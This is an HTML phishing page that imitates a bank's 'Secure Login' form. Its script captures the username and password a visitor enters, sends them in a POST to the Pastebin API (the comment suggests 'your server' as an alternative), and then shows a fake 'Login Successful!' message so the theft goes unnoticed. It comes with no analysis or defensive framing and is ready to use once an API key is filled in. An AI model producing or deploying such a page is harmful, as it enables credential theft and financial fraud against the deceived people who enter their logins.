<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Secure Login - FakeBank</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      margin: 0;
      padding: 0;
    }
    .login-box {
      width: 300px;
      margin: 100px auto;
      padding: 20px;
      background: white;
      border: 1px solid #ccc;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #4285F4;
      color: white;
      border: none;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #357ABD;
    }
    .success-message {
      text-align: center;
      margin-top: 20px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Secure Login - FakeBank</h2>
    <form id="loginForm">
      <input type="text" placeholder="Username" required>
      <input type="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <div class="success-message" id="successMessage" style="display: none;">
    âœ… Login Successful!
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const username = document.querySelector('input[type="text"]').value;
      const password = document.querySelector('input[type="password"]').value;

      // Send data to Pastebin or your server
      fetch('https://pastebin.com/api/api_post.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'api_dev_key=your_api_key&amp;api_option=paste&amp;api_paste_code=' + JSON.stringify({ username, password })
      });

      // Show success message
      document.getElementById('successMessage').style.display = 'block';
      // Optional: Reset the form
      this.reset();
    });
  </script>
</body>
</html>
